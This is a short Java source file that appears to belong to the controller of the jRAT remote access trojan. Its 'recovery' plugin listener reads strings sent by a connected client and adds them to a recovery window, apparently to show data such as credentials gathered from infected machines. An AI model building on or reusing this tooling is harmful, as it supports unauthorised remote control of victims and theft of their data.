package jrat.plugin.recovery.client;

import jrat.api.Client;
import jrat.api.net.PacketListener;

public class EntryPacketListener extends PacketListener {

	@Override
	public void perform(Client client) {
		try {
			int len = client.getDataInputStream().readByte();
			
			String[] data = new String[len];
			
			for (int i = 0; i < len; i++) {
				data[i] = client.readString();
			}
			
			if (FrameRecovery.INSTANCE != null) {
				FrameRecovery.INSTANCE.addEntry(client, data);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
